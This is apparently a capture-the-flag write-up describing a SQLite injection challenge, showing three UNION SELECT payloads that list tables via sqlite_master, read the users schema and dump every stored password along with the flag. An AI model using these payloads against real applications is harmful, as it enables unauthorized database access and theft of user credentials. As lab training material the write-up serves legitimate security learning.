Saw that the sql statement is injectable, and that we are querying from Users table.
Used this payload to see if there are any other tables:
```0 AND 1=0 UNION SELECT 1,(SELECT group_concat(name) FROM sqlite_master)```

The output I got is this:
Other User Details:
id -> 1
username -> users

meaning there is only a users table

The I used this payload to see what users is made up of:
```0 AND 1=0 UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE name='users')```

And I got this output:
Other User Details:
id -> 1
username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))

meaning there is a password field.
So I used this payload to get all of them :)
```0 AND 1=0 UNION SELECT 1,(select group_concat(password)from users)```

And the output I got was this:
Other User Details:
id -> 1
username -> UnrelatedPassword,ExampleUserPassword,WEBSEC{Simple_SQLite_Injection}